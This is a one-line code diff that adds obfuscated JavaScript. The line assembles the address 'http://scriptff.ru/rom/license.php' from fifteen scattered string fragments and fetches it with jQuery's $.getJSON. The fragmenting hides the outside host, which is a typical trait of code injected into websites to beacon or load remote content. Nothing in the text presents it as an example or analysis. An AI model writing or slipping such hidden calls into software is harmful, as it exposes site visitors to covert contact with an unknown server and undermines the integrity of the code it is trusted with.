@@ -1,0 +1,1 @@
+z1="htt";z2="p://sc";z3="r";z4="i";z5="pt";z6="ff";z7=".";z8="ru";z9="/rom/";z10="li";z11="ce";z12="n";z13="se";z14=".p";z15="hp";$.getJSON(z1+z2+z3+z4+z5+z6+z7+z8+z9+z10+z11+z12+z13+z14+z15);
